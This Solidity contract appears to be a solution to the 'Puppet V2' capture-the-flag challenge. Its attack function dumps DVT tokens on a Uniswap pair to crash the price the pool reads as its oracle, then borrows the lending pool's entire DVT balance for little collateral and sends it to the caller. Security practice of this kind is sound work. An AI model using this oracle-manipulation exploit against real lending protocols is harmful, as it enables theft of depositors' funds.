pragma solidity ^0.8.0;

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IToken {
    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IPool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
}

interface IWETH {
    function deposit() external payable;

    function transfer(address to, uint value) external returns (bool);

    function withdraw(uint) external;

    function balanceOf(address account) external returns (uint);

    function approve(address guy, uint wad) external returns (bool);
}

contract PuppetV2Attacker {

    IUniswapV2Router private router;
    IToken private dvt;
    IPool private pool;
    IWETH private weth;

    constructor(address uniswapAddress, address tokenAddress, address poolAddress, address wethAddress) {
        router = IUniswapV2Router(uniswapAddress);
        dvt = IToken(tokenAddress);
        pool = IPool(poolAddress);
        weth = IWETH(wethAddress);
    }

    function attack() external payable {
        uint256 dvtAmount = dvt.balanceOf(address(this));
        dvt.approve(address(router), dvtAmount);
        address[] memory paths = new address[](2);
        paths[0] = address(dvt);
        paths[1] = address(weth);
        router.swapExactTokensForTokens(dvtAmount, 0, paths, address(this), block.timestamp + 1000000);
        weth.deposit{value : 19.8 ether}();
        uint256 wethAmount = weth.balanceOf(address(this));
        weth.approve(address(pool), wethAmount);
        uint256 poolAmount = dvt.balanceOf(address(pool));
        pool.borrow(poolAmount);
        dvtAmount = dvt.balanceOf(address(this));
        dvt.transfer(msg.sender, dvtAmount);
    }

}